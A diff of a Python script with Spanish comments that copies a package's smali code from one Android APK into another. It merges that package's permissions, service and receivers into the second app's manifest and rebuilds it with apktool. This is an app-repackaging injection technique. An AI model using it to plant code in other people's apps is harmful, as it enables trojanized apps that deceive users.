@@ -146,10 +146,11 @@ class ParseManifest:
 
 #Clase para modificar el Manifest
 class EditManifest(ParseManifest):
-	#Se obtiene el manifest del apk original
+	#Se obtiene el manifest de la ruta
     def __init__(self, manifest):
         ParseManifest.__init__(self, manifest=manifest)
 	#Se escribe el mainifest
+
     def write(self):
         self.manifest.write(self.file)
 
@@ -166,6 +167,7 @@ class EditManifest(ParseManifest):
             self.application.append(node)
         self.write()
 	
+	#agrega Receiver
     def addReceiver(self, node, mainpackage):
         if type(node) is list:
             for receiver in node:
@@ -178,6 +180,7 @@ class EditManifest(ParseManifest):
             self.application.append(node)
         self.write()
 
+	#Agrega los permisos 
     def addPermissions(self, node):
         if type(node) is list:
             for permission0 in node:
@@ -194,18 +197,21 @@ class EditManifest(ParseManifest):
             self.root.append(node)
         self.write()
 
-
+#salida en caso de error
 def error(message, ex, code):
     print(message)
     if ex:
         print(ex)
     sys.exit(code)
 
+
+#crea un nuevo archivo
 def sed(file, old, new):
     for line in fileinput.input(file, inplace=True):
         print(line.replace(old, new))
 
 
+#se crea el directorio temporal en caso de no existir
 if not os.path.exists(TempDirectory):
     os.makedirs(TempDirectory)
 
@@ -251,13 +257,26 @@ ParseManifest2 = ParseManifest(manifest=apk2Manifest)
 EditManifest1 = EditManifest(manifest=apk1Manifest)
 EditManifest2 = EditManifest(manifest=apk2Manifest)
 
+#print str(apk1Manifest)
+#print str(apk2Manifest)
+
 apk1Action = apk1Smali + packageToInject.replace('.', '/') + '/'
 apk2Action = apk2Smali + ParseManifest2.findMainPackage().replace('.', '/') + '/' + packageToInject.split('.').pop() + '/'
 
+#print str(apk2Action)
+
+#print "Fuente: " + apk1Smali + packageToInject.replace('.', '/') + '/'
+#shutil.copytree(apk1Smali + packageToInject.replace('.', '/') + '/' ,"./smali1")
+
+#print "Destino: " + apk2Smali + ParseManifest2.findMainPackage().replace('.', '/') + '/' + packageToInject.split('.').pop() + '/'
+#shutil.copytree(apk2Smali + ParseManifest2.findMainPackage().replace('.', '/') + '/' + '/', "./smali2")
+
+
+#copia el directorio  recursivamente apk1Smali
 shutil.copytree(apk1Smali + packageToInject.replace('.', '/') + '/',
             apk2Smali + ParseManifest2.findMainPackage().replace('.', '/') + '/' + packageToInject.split('.').pop() + '/')
 
-
+#Se crean nuevos .smali remplazando el paquete principal 
 for file in glob.glob(apk2Action + '*.smali'):
     sed(file, ParseManifest1.findMainPackage().replace('.', '/'), ParseManifest2.findMainPackage().replace('.', '/'))
 
@@ -265,10 +284,13 @@ EditManifest2.addPermissions(ParseManifest1.listNodePermissions())
 EditManifest2.addService(ParseManifest1.listNodeService()[0], ParseManifest1.findMainPackage())
 EditManifest2.addReceiver(ParseManifest1.listNodeReceiver(), ParseManifest1.findMainPackage())
 
+
+#Se compila el nuevo apk
 try:
     call(apktool + " b -d -f " + apk2Directory, shell=True)
 except OSError as ex:
     error("No se pudo compilar " + apk2Directory , str(ex), 1)
+
 
 
 try:
